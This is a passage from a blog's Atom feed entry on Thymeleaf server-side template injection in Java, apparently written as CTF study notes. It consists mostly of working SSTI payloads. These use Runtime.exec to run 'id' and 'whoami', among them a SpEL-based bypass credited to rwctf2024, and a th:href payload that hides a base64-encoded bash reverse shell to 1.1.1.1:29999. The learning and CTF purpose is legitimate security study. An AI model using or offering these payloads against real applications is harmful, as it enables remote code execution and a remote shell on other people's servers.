string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token function">x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.0.15版本，来自于rwctf2024</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token punctuation">[</span>$<span class="token punctuation">&#123;</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Boolean</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.ObjectMapper"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span>SpelExpressionParser</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span><span class="token string">"T(Runtime).getRuntime().exec('whoami')"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name"><span class="token namespace">th:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzI5OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;')&#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>pepito<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;趁热打铁，昨天刚学完thymeleaf引擎今天直接上注入&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/10514&quot;&gt;https://xz.aliyun.com/t/10514&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/254519&quot;&gt;https://www.anquanke.com/post/id/254519&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/&quot;&gt;https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnpanda.net/sec/1063.html&quot;&gt;https://www.cnpanda.net/sec/1063.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="SSTI" scheme="http://c1oudfl0w0.github.io/blog/tags/SSTI/"/>
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
</feed>
